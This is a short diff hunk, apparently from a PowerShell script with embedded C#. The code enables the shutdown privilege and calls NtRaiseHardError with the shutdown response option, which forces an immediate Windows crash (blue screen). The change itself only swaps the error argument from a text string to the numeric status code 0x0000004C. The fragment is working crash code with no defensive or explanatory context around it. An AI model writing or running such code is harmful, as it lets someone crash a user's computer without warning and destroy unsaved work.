@@ -32,7 +32,7 @@ public static class CS{
 		Boolean tmp1;
 		uint tmp2;
 		RtlAdjustPrivilege(19, true, false, out tmp1);
-		NtRaiseHardError("your computer gave up", 0, 0, IntPtr.Zero, 6, out tmp2);
+		NtRaiseHardError(0x0000004C, 0, 0, IntPtr.Zero, 6, out tmp2);
 	}
 }
 "@
